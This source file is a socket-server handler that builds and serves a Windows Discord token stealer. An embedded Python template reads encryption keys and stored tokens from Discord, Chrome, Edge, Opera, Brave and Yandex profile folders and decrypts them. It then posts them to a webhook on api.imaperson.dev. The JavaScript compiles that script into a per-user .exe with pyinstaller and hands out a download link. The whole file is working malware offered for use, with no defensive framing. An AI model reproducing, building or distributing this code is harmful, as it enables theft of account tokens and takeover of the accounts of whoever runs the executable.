import { execSync } from "child_process";
import fs from "fs";

const templateScript = `from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import os
import json
import re
import time
from urllib.request import Request, urlopen

WEBHOOK_URL = "https://api.imaperson.dev/discord/{{id}}"

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception as e:
        return "An error has occured.\\n" + e

def find_tokens(path):
    tokens = []
    enctokens = []
    cleaned = []

    if not os.path.exists(f"{path}\\\\Local State") or not os.path.exists(f"{path}\\\\Local Storage\\\\leveldb"):
        return []
    
    with open(f"{path}\\\\Local State", "r") as file:
        key = json.loads(file.read())["os_crypt"]["encrypted_key"]
        file.close()

    path += "\\\\Local Storage\\\\leveldb"
    
    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue
        else:
            try:
                with open(f"{path}\\\\{file}", "r", errors="ignore") as files:
                    for x in files.readlines():
                        x.strip()
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\"]*", x):
                            enctokens.append(values)
            except PermissionError:
                continue
    for i in enctokens:
        if i.endswith("\\\\"):
            i.replace("\\\\", "")
        elif i not in cleaned:
            cleaned.append(i)
    for token in cleaned:
        tokens.append(decrypt(b64decode(token.split("dQw4w9WgXcQ:")[1]), b64decode(key)[5:]))

    return list(set(tokens))

def main():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")

    paths = {
        "Discord": roaming + "\\\\Discord",
        "Discord Canary": roaming + "\\\\discordcanary",
        "Discord PTB": roaming + "\\\\discordptb",
        "Google Chrome": local + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
        "Microsoft Edge": local + "\\\\Microsoft\\\\Edge\\\\User Data\\\\Default",
        "Opera": roaming + "\\\\Opera Software\\\\Opera Stable",
        "Brave": local + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
        "Yandex": local + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default",
    }

    message = {}

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)
            
        if len(tokens) > 0:
            for token in tokens:
                if not message.get(platform):
                    message[platform] = []
                message[platform].append(token)

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
        quit()
    except:
        pass

if __name__ == "__main__":
    main()
`;

export default (io, socket, args) => {
    if (!fs.existsSync(`socket/discord/token-${socket.id}.exe`)) {
        fs.writeFileSync(`socket/discord/temp-${socket.id}.py`, templateScript.replace("{{id}}", socket.id));
    
        execSync(`pyinstaller socket/discord/temp-${socket.id}.py -F --clean -y -n token-${socket.id} --distpath ./socket/discord/ --log-level CRITICAL && rmdir build /q /s && del token-${socket.id}.spec`);
        
        fs.rmSync(`socket/discord/temp-${socket.id}.py`);
    }

    socket.emit("discord-link", { link: `/discord/dl/${socket.id}.exe` });
}